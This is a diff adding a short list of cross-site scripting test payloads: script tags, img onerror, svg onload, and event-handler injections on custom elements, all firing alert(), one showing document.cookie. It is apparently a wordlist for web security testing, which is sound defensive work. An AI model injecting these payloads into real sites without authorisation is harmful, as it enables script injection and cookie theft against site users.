@@ -1,0 +1,24 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<script>alert(window.origin)</script>
+<script>alert(document.cookie)</script>
+<script onbeforepaste="alert(1)" contenteditable>test</script>
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
